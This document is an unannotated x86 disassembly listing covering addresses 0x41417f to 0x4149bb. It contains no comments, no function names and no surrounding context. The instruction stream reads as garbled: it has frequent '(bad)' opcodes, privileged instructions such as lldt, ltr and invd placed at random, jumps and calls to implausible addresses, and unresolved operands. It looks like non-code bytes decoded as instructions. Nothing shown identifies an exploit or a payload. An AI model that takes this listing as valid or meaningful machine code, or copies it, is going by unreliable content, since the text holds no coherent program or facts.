  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
